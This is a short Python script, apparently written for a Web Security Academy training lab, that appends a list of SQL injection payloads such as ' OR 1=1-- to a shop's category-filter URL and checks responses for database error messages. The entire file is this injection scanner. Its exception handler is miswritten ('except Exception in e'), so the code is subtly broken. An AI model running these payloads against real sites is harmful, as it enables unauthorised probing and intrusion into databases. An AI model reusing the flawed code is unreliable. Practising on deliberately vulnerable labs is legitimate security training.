import requests

url ="https://0a9b00f804728027810253e7003800d2.web-security-academy.net/filter?category=Gifts"

payloads =[
    "' OR '1'='1",
    "' OR 1=1--",
    "' AND 1=1--",
    "' AND 1=2--",
    "'",
    "/",
    "';--",
    "' or 1=1/*",
    "admin' --"
]

error_signatures =[
    "sql syntax",
    "mysql_fetch",
    "you have an error",
    "warning",
    "unclosed quotation",
]

for payload in payloads:
    test_url = url + payload
    try:
        response = requests.get(test_url)
        print(f"Testing payload : {payload}")

        if any(error.lower() in response.text.lower() for error in error_signatures):
             print(f" possible sql injection vulnerability with payload : {payload}\n")

        else:
            print(f"no detection :{payload}\n")
 
    except Exception in e:
        print(f"requests failed : {e}\n")




                
            